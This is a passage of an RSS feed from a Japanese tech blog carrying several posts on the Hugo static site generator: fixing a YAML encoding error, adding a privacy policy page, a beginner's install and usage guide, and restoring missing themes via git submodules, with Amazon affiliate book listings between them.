&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>hugoで[failed to unmarshal YAML]エラーが出た場合の対処法</title><link>https://suzukiiichiro.github.io/posts/2021-12-21-03/</link><pubDate>Wed, 22 Dec 2021 21:22:23 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2021-12-21-03/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2021-12-21-03/error.jpg" alt="Featured image of post hugoで[failed to unmarshal YAML]エラーが出た場合の対処法" />&lt;h2 id="エラーの内容">エラーの内容&lt;/h2>
&lt;p>記事投稿時にfailed to unmarshal YAM エラーが起こった時の原因について&lt;br>
hugo new ファイル名 で投稿用のエントリーを作成し、いざhugo コマンドで記事をアップしようとした時に以下のエラーが出ました。&lt;/p>
&lt;p>Start building sites …&lt;br>
Total in 10 ms&lt;br>
Error: Error building site: &amp;ldquo;/xxxx/xxxx/xxxx.github.io/content/posts/2021-12-21-03.md:2:1&amp;rdquo;: failed to unmarshal YAML: yaml: control characters are not allowed&lt;/p>
&lt;h2 id="原因">原因&lt;/h2>
&lt;p>このようなエラーが出る場合原因として考えられるのがファイルの文字コードがUTF-8になってないことです。&lt;br>
vim でファイル名を開くと右下に文字コードが表示されますが「iso-2022-jp-3」のようになってませんでしょうか？&lt;/p>
&lt;h2 id="対応">対応&lt;/h2>
&lt;p>この場合ファイルの文字コードをUTF8に変更してみましょう。&lt;/p>
&lt;pre tabindex="0">&lt;code>nkf -wLu ファイル名 &amp;gt;一時保存ファイル名;
mv 一時保存ファイル名 ファイル名
&lt;/code>&lt;/pre>&lt;p>一時保存した後にmvで戻したり面倒ですよね。&lt;/p>
&lt;p>hugo new した時に日本語が含まれていたら文字コードutf8になると思われるので設定で回避できないか次回調べてみたいと思います。&lt;/p></description></item><item><title>プライバシーポリシーページを設置する</title><link>https://suzukiiichiro.github.io/posts/2021-12-21-02/</link><pubDate>Wed, 22 Dec 2021 17:40:27 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2021-12-21-02/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2021-12-21-02/privacy.jpg" alt="Featured image of post プライバシーポリシーページを設置する" />&lt;p>github pagesでもgoogle adsenseの審査に通過したい！&lt;/p>
&lt;p>ということで色々先人の方達のサイトをみさせていただいたところ&lt;/p>
&lt;p>google adsenseを通過するためにはプライバシーポリシーが必要ということで準備しました。&lt;/p>
&lt;h2 id="内容はとりあえずコピペで行こう">内容はとりあえずコピペで行こう&lt;/h2>
&lt;p>まずはコピペOKの親切な方のサイトを探します。&lt;/p>
&lt;p>内容については以下のサイトを参考にさせていただきました。&lt;br>
&lt;a class="link" href="http://liberty-life-blog.com/wordpress/privacy-policy/" target="_blank" rel="noopener"
>http://liberty-life-blog.com/wordpress/privacy-policy/&lt;/a>&lt;/p>
&lt;h2 id="設定">設定&lt;/h2>
&lt;p>以下のコマンドでhugoでページを作成します。&lt;/p>
&lt;pre tabindex="0">&lt;code>hugo new page/privacy.md
&lt;/code>&lt;/pre>&lt;p>コンテンツの構成を以下のように管理しているのでpage以下に保存しました。&lt;br>
content/posts &amp;ndash; 記事&lt;br>
/page &amp;ndash; about usページなど&lt;br>
/assetes &amp;ndash; 画像など&lt;/p>
&lt;pre tabindex="0">&lt;code>vim content/page/privacy.md
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>---
title: &amp;quot;Privacy&amp;quot;
date: 2021-12-22T17:16:15+09:00
draft: false
---
&lt;/code>&lt;/pre>&lt;p>ページの内容を２個目の&amp;mdash;以下に貼り付けます&lt;br>
draft: true に変更します&lt;/p>
&lt;pre tabindex="0">&lt;code>hugo
&lt;/code>&lt;/pre>&lt;p>ビルドします&lt;/p>
&lt;h2 id="フッターにリンクを置こう">フッターにリンクを置こう&lt;/h2>
&lt;p>フッターの内容を修正してプライバシーポリシーのリンクを設置します。&lt;br>
themes以下にあるファイルを直接書き換えるのではなく&lt;br>
layoutsフォルダ以下に同名のファイルを作成することで上書きすることができるみたいです。&lt;/p>
&lt;p>layouts/partial/footer/footer.html&amp;lt;&amp;ndash;優先順位高い&lt;br>
themes/テーマ名/layouts/partial/footer/footer.html&lt;/p>
&lt;p>layouts/partial/footer/footer.html を新規に作成して&lt;br>
以下の内容を入力&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;footer class=&amp;quot;site-footer&amp;quot;&amp;gt;
&amp;lt;a href=&amp;quot;{{ .Site.BaseURL }}privacy/&amp;quot;&amp;gt;プライバシーポリシー&amp;lt;/a&amp;gt;
&amp;lt;section class=&amp;quot;copyright&amp;quot;&amp;gt;
&amp;amp;copy;
{{ if and (.Site.Params.footer.since) (ne .Site.Params.footer.since (int (now.Format &amp;quot;2006&amp;quot;))) }}
{{ .Site.Params.footer.since }} -
{{ end }}
{{ now.Format &amp;quot;2006&amp;quot; }} {{ .Site.Title }}
&amp;lt;/section&amp;gt;
&amp;lt;/footer&amp;gt;
&lt;/code>&lt;/pre>&lt;p>リンクの書き方が&lt;br>
{{ .Site.BaseURL }}privacy/&lt;br>
のは注意&lt;/p></description></item><item><title>デザイナーでもできる初めてのHUGOでのサイト作成 #01</title><link>https://suzukiiichiro.github.io/posts/2021-12-22-hugo-01-ywat/</link><pubDate>Wed, 22 Dec 2021 13:07:49 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2021-12-22-hugo-01-ywat/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2021-12-22-hugo-01-ywat/2021-12-22-hugo-01.jpg" alt="Featured image of post デザイナーでもできる初めてのHUGOでのサイト作成 #01" />&lt;p>CMSではWordPressが有名ですが、phpやサーバの準備などに時間がかかってしまったり、ちょっと敷居が高いイメージではないでしょうか。&lt;br>
WordPressのインストールのためにはサーバも必要ですし、ドメインだって必要です。&lt;/p>
&lt;p>色々用意するのが手間だなと思う人は、Hugo+GitHubで簡単に、早く、さっくりとサイトを作ってしまうのをオススメします。&lt;br>
無料で、httpsも設定できるので非常に便利です。&lt;/p>
&lt;h2 id="hugoとは">HUGOとは&lt;/h2>
&lt;p>&lt;a class="link" href="https://gohugo.io/" target="_blank" rel="noopener"
>HUGO&lt;/a>とはGo言語で記述され、速度や使いやすさ、設定のしやすさなどを重視して最適化された静的なHTMLやCSSのサイトジェネレーターです。コンテンツとテンプレートを分けて構築し、それらを組み合わせてHTMLをレンダリングします。&lt;/p>
&lt;p>Hugoでブログを記述する際には「Markdown」と呼ばれる言語を使います。&lt;br>
サイトを公開、再構築する際には「hugo」というコマンドを使用します。&lt;br>
このコマンドはどのディレクトリからでも実行することができるので、特権アカウントを持っていない共有ホストやその他のシステムで使用することも可能です。&lt;/p>
&lt;p>そして、中程度のサイズの典型的なWebサイトをほんの一瞬でレンダリングします。&lt;br>
経験則として、各コンテンツは約1ミリ秒でレンダリングされ、ブログやドキュメントなど、どのような種類のウェブサイトでもうまく動作するように設計されています。&lt;/p>
&lt;h3 id="サポートされるアーキテクチャ">サポートされるアーキテクチャ&lt;/h3>
&lt;p>サポートされるアーキテクチャは2022年1月時点で、Windows、Linux、FreeBSD、NetBSD、DragonFly BSD、OpenBSD、macOS (Darwin)、 Android用にx64、i386、ARMアーキテクチャ用のHugoバイナリをビルド済みで提供しています。&lt;/p>
&lt;p>HUGOは、Goコンパイラツールが実行できる場所であれば、ソースからコンパイルすることもできます。たとえば、Plan 9やSolarisを含む他のオペレーティングシステムにも対応しています。&lt;/p>
&lt;h2 id="hugoのインストール">Hugoのインストール&lt;/h2>
&lt;p>HUGOをサイトジェネレーターとして使用する場合は、すごく簡単で、Hugoバイナリをインストールするだけで、バイナリには外部依存関係はありません。&lt;/p>
&lt;h3 id="バイナリクロスプラットフォーム">バイナリ（クロスプラットフォーム）&lt;/h3>
&lt;p>GitHubにある &lt;a class="link" href="https://github.com/gohugoio/hugo/releases" target="_blank" rel="noopener"
>Releases&lt;/a> からプラットフォームに適したバージョンをダウンロードします。&lt;br>
ダウンロードしたバイナリはどこからでも実行可能です。&lt;br>
グローバルな場所にインストールする必要はなく、権限のないアカウントや共有ホストやその他のシステムでも動作します。&lt;/p>
&lt;p>理想的には、 &lt;code>/usr/local/bin&lt;/code> など使いやすいようにどこかにインストールする必要があります。&lt;/p>
&lt;h3 id="macでbrewを使う場合">Macでbrewを使う場合&lt;/h3>
&lt;p>macOSを使用していて、&lt;a class="link" href="https://brew.sh/index_ja" title="Homebrew"
target="_blank" rel="noopener"
>Homebrew&lt;/a>を使用している場合は、次のワンライナーを使用してHugoをインストールできます。&lt;br>
&lt;small>※端末はMacで進めていきます。開発なども便利なのでMacを持っていると何かと便利ですよ。&lt;/small>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">brew install hugo
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="macportsの場合">MacPortsの場合&lt;/h3>
&lt;p>macOSを使用していてMacPortsを使用している場合は、次のワンライナーを使用してHugoをインストールできます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">port install hugo
&lt;/code>&lt;/pre>&lt;/div>&lt;p>その他の端末でもコマンドを利用してダウンロード可能です。&lt;br>
詳しくは &lt;a class="link" href="https://gohugo.io/getting-started/installing/" target="_blank" rel="noopener"
>Install Hugo&lt;/a> を見てみてください。&lt;/p>
&lt;h2 id="設定">設定&lt;/h2>
&lt;p>HUGOはさまざまなコマンドラインの機能を備えていますが、コマンドラインに不慣れな場合でも簡単に使用できます。&lt;br>
以下は、Hugoプロジェクトの開発中に使用するもっとも一般的なコマンドの説明です。&lt;/p>
&lt;h3 id="インストールの確認">インストールの確認&lt;/h3>
&lt;p>Hugoをインストールしたら、PATHがあることを確認してください。&lt;code>help&lt;/code>コマンドを使用して、Hugoが正しくインストールされていることをテストできます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">hugo &lt;span class="nb">help&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>実行すると、コンソールに表示される出力は次のようになるかと思います。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">hugo is the main command, used to build your Hugo site.
Hugo is a Fast and Flexible Static Site Generator
built with love by spf13 and friends in Go.
Complete documentation is available at http://gohugo.io/.
Usage:
hugo &lt;span class="o">[&lt;/span>flags&lt;span class="o">]&lt;/span>
hugo &lt;span class="o">[&lt;/span>command&lt;span class="o">]&lt;/span>
Available Commands:
check Contains some verification checks
completion generate the autocompletion script &lt;span class="k">for&lt;/span> the specified shell
config Print the site configuration
convert Convert your content to different formats
deploy Deploy your site to a Cloud provider.
env Print Hugo version and environment info
gen A collection of several useful generators.
&lt;span class="nb">help&lt;/span> Help about any &lt;span class="nb">command&lt;/span>
import Import your site from others.
list Listing out various types of content
mod Various Hugo Modules helpers.
new Create new content &lt;span class="k">for&lt;/span> your site
server A high performance webserver
version Print the version number of Hugo
Flags:
-b, --baseURL string hostname &lt;span class="o">(&lt;/span>and path&lt;span class="o">)&lt;/span> to the root, e.g. http://spf13.com/
-D, --buildDrafts include content marked as draft
-E, --buildExpired include expired content
-F, --buildFuture include content with publishdate in the future
--cacheDir string filesystem path to cache directory. Defaults: &lt;span class="nv">$TMPDIR&lt;/span>/hugo_cache/
--cleanDestinationDir remove files from destination not found in static directories
--config string config file &lt;span class="o">(&lt;/span>default is path/config.yaml&lt;span class="p">|&lt;/span>json&lt;span class="p">|&lt;/span>toml&lt;span class="o">)&lt;/span>
--configDir string config dir &lt;span class="o">(&lt;/span>default &lt;span class="s2">&amp;#34;config&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>
-c, --contentDir string filesystem path to content directory
--debug debug output
-d, --destination string filesystem path to write files to
--disableKinds strings disable different kind of pages &lt;span class="o">(&lt;/span>home, RSS etc.&lt;span class="o">)&lt;/span>
--enableGitInfo add Git revision, date and author info to the pages
-e, --environment string build environment
--forceSyncStatic copy all files when static is changed.
--gc &lt;span class="nb">enable&lt;/span> to run some cleanup tasks &lt;span class="o">(&lt;/span>remove unused cache files&lt;span class="o">)&lt;/span> after the build
-h, --help &lt;span class="nb">help&lt;/span> &lt;span class="k">for&lt;/span> hugo
--i18n-warnings print missing translations
--ignoreCache ignores the cache directory
--ignoreVendor ignores any _vendor directory
--ignoreVendorPaths string ignores any _vendor &lt;span class="k">for&lt;/span> module paths matching the given Glob pattern
-l, --layoutDir string filesystem path to layout directory
--log &lt;span class="nb">enable&lt;/span> Logging
--logFile string log File path &lt;span class="o">(&lt;/span>&lt;span class="k">if&lt;/span> set, logging enabled automatically&lt;span class="o">)&lt;/span>
--minify minify any supported output format &lt;span class="o">(&lt;/span>HTML, XML etc.&lt;span class="o">)&lt;/span>
--noChmod don&lt;span class="s1">&amp;#39;t sync permission mode of files
&lt;/span>&lt;span class="s1"> --noTimes don&amp;#39;&lt;/span>t sync modification &lt;span class="nb">time&lt;/span> of files
--path-warnings print warnings on duplicate target paths etc.
--poll string &lt;span class="nb">set&lt;/span> this to a poll interval, e.g --poll 700ms, to use a poll based approach to watch &lt;span class="k">for&lt;/span> file system changes
--print-mem print memory usage to screen at intervals
--quiet build in quiet mode
--renderToMemory render to memory &lt;span class="o">(&lt;/span>only useful &lt;span class="k">for&lt;/span> benchmark testing&lt;span class="o">)&lt;/span>
-s, --source string filesystem path to &lt;span class="nb">read&lt;/span> files relative from
--templateMetrics display metrics about template executions
--templateMetricsHints calculate some improvement hints when combined with --templateMetrics
-t, --theme strings themes to use &lt;span class="o">(&lt;/span>located in /themes/THEMENAME/&lt;span class="o">)&lt;/span>
--themesDir string filesystem path to themes directory
--trace file write trace to file &lt;span class="o">(&lt;/span>not useful in general&lt;span class="o">)&lt;/span>
-v, --verbose verbose output
--verboseLog verbose logging
-w, --watch watch filesystem &lt;span class="k">for&lt;/span> changes and recreate as needed
Use &lt;span class="s2">&amp;#34;hugo [command] --help&amp;#34;&lt;/span> &lt;span class="k">for&lt;/span> more information about a command.
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="hugoコマンド">hugoコマンド&lt;/h3>
&lt;p>一般的な使い方は、カレント・ディレクトリを入力ディレクトリとしてhugoを実行することだと思います。&lt;br>
デフォルトでpublic/ ディレクトリにウェブサイトを生成しますが、サイトの設定（configファイル）でpublishDirフィールドを変更することにより、出力ディレクトリをカスタマイズできます。&lt;/p>
&lt;p>hugoコマンドはサイトをpublic/ディレクトリにレンダリングし、ウェブサーバにデプロイする準備ができます。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ hugo
0 draft content
0 future content
99 pages created
0 paginator pages created
16 tags created
0 groups created
in 90 ms
&lt;/code>&lt;/pre>&lt;h2 id="使ってみる">使ってみる&lt;/h2>
&lt;p>hugoのインストールが終わったら、サイトを作成します。&lt;/p>
&lt;pre tabindex="0">&lt;code>hugo new site ＜作成するディレクトリ＞
&lt;/code>&lt;/pre>&lt;p>色々表示されているかと思いますが、気にしないで大丈夫です。&lt;/p>
&lt;h3 id="設定ファイル">設定ファイル&lt;/h3>
&lt;p>hugoの設定はTOMLという形式で記述します。&lt;br>
TOMLに慣れていない人はJSONやYAMLといった形式でも記述できます。&lt;br>
その場合はconfig.tomlを削除してください。&lt;/p>
&lt;pre tabindex="0">&lt;code>baseURL = &amp;quot;http://example.org/&amp;quot;
languageCode = &amp;quot;en-us&amp;quot;
title = &amp;quot;My New Hugo Site&amp;quot;
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>baseURL: サイトの公開URL&lt;/li>
&lt;li>languageCode: HTMLのlang部分&lt;/li>
&lt;li>title: サイトの名前&lt;/li>
&lt;/ul>
&lt;h2 id="記事の投稿">記事の投稿&lt;/h2>
&lt;p>記事を作成するにはコマンドを打つ必要があります&lt;/p>
&lt;pre tabindex="0">&lt;code>hugo new posts/helloworld.md
&lt;/code>&lt;/pre>&lt;p>このコマンドで、postsディレクトリ以下にhelloworld.mdといったファイルが生成されます&lt;br>
テーマによってはpostsディレクトリではなく、postであったりするので、テーマの詳細を確認してください。&lt;/p>
&lt;h2 id="下書きから公開へ">下書きから公開へ&lt;/h2>
&lt;p>作成されたファイルはmarkdown形式で記述されています。&lt;/p>
&lt;pre tabindex="0">&lt;code>---
title: &amp;quot;helloworld&amp;quot;
date: 2021-12-22T11:23:09Z
draft: true
---
&lt;/code>&lt;/pre>&lt;p>draftの部分が下書き状態を表しています。&lt;br>
falseにすることで公開となり表示されます。&lt;/p>
&lt;h3 id="hugoでの下書き未来期限切れについて">HUGOでの下書き、未来、期限切れについて&lt;/h3>
&lt;p>Hugoでは、コンテンツの記述時にドラフト、公開日、そして有効期限を設定できます。デフォルトでは、Hugoは公開（draft: true）しません。&lt;/p>
&lt;p>また、以下の場合はコンテンツを公開しないので、注意してください&lt;/p>
&lt;ul>
&lt;li>publishdateが将来の公開日を指定したコンテンツ&lt;/li>
&lt;li>draft: trueのステータスを持つコンテンツ&lt;/li>
&lt;li>有効期限（expirydate）を過ぎたコンテンツ&lt;/li>
&lt;/ul>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>予約投稿&lt;/dt>
&lt;dd>公開日付（&lt;strong>publishdate&lt;/strong>）が未来で、公開状態にある記事は予約投稿として扱われます。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>有効期限付き&lt;/dt>
&lt;dd>&lt;strong>expirydate&lt;/strong> に日付を指定することで、記事の有効期限を設定することも可能です。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="確認">確認&lt;/h2>
&lt;p>サイトの確認を行うには&lt;br>
hugoをインストールしたディレクトリで&lt;/p>
&lt;pre tabindex="0">&lt;code>hugo server
&lt;/code>&lt;/pre>&lt;p>を実行します。&lt;br>
この場合は公開されている記事のみを表示した状態のサーバが立ち上がります。&lt;br>
未公開も含めたい場合は&lt;/p>
&lt;pre tabindex="0">&lt;code>hugo server -D
&lt;/code>&lt;/pre>&lt;p>とすることで表示できます。&lt;/p>
&lt;h2 id="公開">公開&lt;/h2>
&lt;p>公開をするにはサイト全体を構築し直す必要があります。&lt;/p>
&lt;pre tabindex="0">&lt;code>hugo
&lt;/code>&lt;/pre>&lt;p>このコマンドでサイト全体が自動的に生成されます。&lt;br>
作成されたサイトは初期状態ではpublicディレクトリに展開されます。&lt;br>
configの&lt;em>publicDir&lt;/em>に任意のディレクトリを設定することも可能です&lt;/p>
&lt;pre tabindex="0">&lt;code>publicDir = 'docs'
&lt;/code>&lt;/pre>&lt;p>この場合はdocsディレクトリに公開ファイルが展開されます。&lt;/p>
&lt;h2 id="終わりに">終わりに&lt;/h2>
&lt;p>駆け足でしたが、hugoの簡単な使い方になります。&lt;br>
大きな設定も不要で、markdownで記述できるので初心者やデザイナーなどでもとっつきやすいのではないかと思います。&lt;br>
みなさんもぜひ、hugoを試してみてください。&lt;/p>
&lt;h2 id="オススメの書籍">オススメの書籍&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/Hugo%e3%81%a7%e5%a7%8b%e3%82%81%e3%82%8b%e9%9d%99%e7%9a%84%e3%82%b5%e3%82%a4%e3%83%88%e6%a7%8b%e7%af%89%e5%85%a5%e9%96%80-%e9%9d%99%e7%9a%84%e3%82%b5%e3%82%a4%e3%83%88%e3%82%b8%e3%82%a7%e3%83%8d%e3%83%ac%e3%83%bc%e3%82%bf%e3%83%bc%e3%81%a7%e4%bd%9c%e3%82%8b%e8%87%aa%e4%bd%9c%e3%82%b5%e3%82%a4%e3%83%88-%e6%8a%80%e8%a1%93%e3%81%ae%e6%b3%89%e3%82%b7%e3%83%aa%e3%83%bc%e3%82%ba%ef%bc%88NextPublishing%ef%bc%89-meganii/dp/4844379208/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://images-fe.ssl-images-amazon.com/images/I/51DRDYXF0CL.jpg" alt=" Hugoで始める静的サイト構築入門　静的サイトジェネレーターで作る自作サイト (技術の泉シリーズ（NextPublishing）) ">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> Hugoで始める静的サイト構築入門　静的サイトジェネレーターで作る自作サイト (技術の泉シリーズ（NextPublishing）) &lt;/h2>
&lt;p> 本書は静的サイトジェネレーターの一つであるHugoの解説書です。できるだけ低コストでサイトを運用したい、WordPressなどの各種CMSから移行したい、というケースに合わせて構築方法などを解説します。Hugoを利用してオリジナリティーのあるサイトを自分で構築、管理したい方に向けての一冊です。 &lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/%e3%80%90%e7%89%b9%e5%85%b8%e4%bb%98%e3%81%8d-%e3%80%91Web%e3%82%b5%e3%82%a4%e3%83%88%e9%ab%98%e9%80%9f%e5%8c%96%e3%81%ae%e3%81%9f%e3%82%81%e3%81%ae-%e9%9d%99%e7%9a%84%e3%82%b5%e3%82%a4%e3%83%88%e3%82%b8%e3%82%a7%e3%83%8d%e3%83%ac%e3%83%bc%e3%82%bf%e3%83%bc%e6%b4%bb%e7%94%a8%e5%85%a5%e9%96%80-Compass-Books%e3%82%b7%e3%83%aa%e3%83%bc%e3%82%ba/dp/4839973008/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://images-fe.ssl-images-amazon.com/images/I/51vWxSWEAxL.jpg" alt=" 【特典付き! 】Webサイト高速化のための 静的サイトジェネレーター活用入門 (Compass Booksシリーズ) ">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> 【特典付き! 】Webサイト高速化のための 静的サイトジェネレーター活用入門 (Compass Booksシリーズ) &lt;/h2>
&lt;p> GatsbyJSで実現する、高速&amp;amp;実用的なサイト構築 「高速化&amp;amp;最適化」「メタデータ対応」「SPAやPWAへの対応」など、これからのWebサイトに求められる要素に対応するための、静的サイトジェネレーターの活用書。 本書は「GatsbyJS(Gatsby)」を使って、「ReactやJavaScript(ECMAScript)に自信が無くても、実用レベルのWebサイトを構築できるようになる」ことを目標にしています。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/Markdown%e3%83%a9%e3%82%a4%e3%83%86%e3%82%a3%e3%83%b3%e3%82%b0%e5%85%a5%e9%96%80-%e3%83%97%e3%83%ac%e3%83%bc%e3%83%b3%e3%83%86%e3%82%ad%e3%82%b9%e3%83%88%e3%81%a7%e6%b0%97%e6%a5%bd%e3%81%ab%e6%9b%b8%e3%81%93%e3%81%86%ef%bc%81-%e6%8a%80%e8%a1%93%e3%81%ae%e6%b3%89%e3%82%b7%e3%83%aa%e3%83%bc%e3%82%ba%ef%bc%88NextPublishing%ef%bc%89-%e8%97%a4%e5%8e%9f-%e6%83%9f/dp/4844398369/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://images-fe.ssl-images-amazon.com/images/I/514KHlwilvL.jpg" alt=" Markdownライティング入門　プレーンテキストで気楽に書こう！ (技術の泉シリーズ（NextPublishing）) ">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> Markdownライティング入門　プレーンテキストで気楽に書こう！ (技術の泉シリーズ（NextPublishing）) &lt;/h2>
&lt;p>本書は、文章を書く=ライティングを「気楽に」行うための道具としての「Markdown」形式を紹介し、その使い方を詳しく解説しています。Wordなどのワープロソフトに限定されることなく、テキストエディタやMarkdown専用エディタ、ポメラなどの文書入力専用機、さらにはスマートホン上でも「見出し」や「強調」といった文章執筆に必要な情報を共有するための書式であるMarkdownの書き方やその定義や起源を、初心者でもわかりやすく紹介しています。 &lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>Hugoでテーマが反映されない（画面が真っ白のまま）</title><link>https://suzukiiichiro.github.io/posts/2021-12-21/</link><pubDate>Tue, 21 Dec 2021 18:08:57 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2021-12-21/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2021-12-21/2021-12-21.jpg" alt="Featured image of post Hugoでテーマが反映されない（画面が真っ白のまま）" />&lt;p>Hugoではテーマ（theme）を使って簡単にブログやサイトを作成することが可能です。テーマはGitHubなどにたくさん公開されて簡単に導入することが可能です。&lt;br>
しかし、テーマををインストールするのを忘れてしまうと、不具合の原因につながってしまうので注意が必要です。&lt;/p>
&lt;p>今回はHugoを使って構築したサイトで、テーマが反映されずに画面が真っ白のまま担ってしまった場合の対処法を説明してきます。&lt;/p>
&lt;h2 id="テーマはサブモジュールでインストール">テーマはサブモジュールでインストール&lt;/h2>
&lt;p>テーマはGitで管理されていることが多いので、そのままインストールしてしまうとHugoのディレクトリを汚染してしまいます。&lt;br>
Hugoでテーマをインストールする際はサブモジュール（submodule）として管理するようにしましょう。そうすることで、本来のHugoディレクトリに影響を与えることなく、テーマのアップデートなどを実行できます。&lt;/p>
&lt;h2 id="サイトをクローンしたら画面が真っ白のままになった">サイトをクローンしたら画面が真っ白のままになった&lt;/h2>
&lt;p>Hugoで作成したサイトを別の端末などでクローンした際に、画面が真っ白になってしまうことがあります。この問題に直面した場合は、まずはテーマがインストールされているかを確認しましょう。&lt;/p>
&lt;p>インストールされていない場合は、サブモジュール化されたテーマを再度インストールすることで画面が真っ白い状態から正常な表示に変わるかと思います。&lt;/p>
&lt;p>サブモジュールのインストールコマンドは下記のようになります。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">git submodule update --init --recursive
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Hugoのサイトを&lt;code>git clone&lt;/code>する際は、テーマが反映されない場合が多いので、サブモジュールのインストールも忘れずに行うようにしましょう。&lt;/p>
&lt;h2 id="クローンするときに一緒にサブモジュールもインストール">クローンするときに一緒にサブモジュールもインストール&lt;/h2>
&lt;p>そうは言っても、サブモジュールのインストールを忘れることが多いです。&lt;br>
その場合は、初回git cloneする際にsubmodule（サブモジュール）も一緒にcloneすることで不具合を起こすことなく、表示することができます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">git clone --recursive &lt;span class="o">{&lt;/span>クローンしたいリポジトリ&lt;span class="o">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="まとめ">まとめ&lt;/h2>
&lt;p>Hugoでテーマが反映されない（画面が真っ白のまま）のときの対応はいかがだったでしょうか。&lt;br>
サブモジュールで管理できるのは便利であると同時に、忘れてしまうとサイトの不具合につながってしまい、別端末で正常に動作していると解決が難しくなってしまうことも多いと思います。&lt;br>
Hugoのサイトをgit cloneする際はサブモジュールでテーマの反映も忘れないようにしておきましょう。&lt;/p>
&lt;h2 id="おすすめの書籍">おすすめの書籍&lt;/h2>
&lt;aside class="amazon-box">
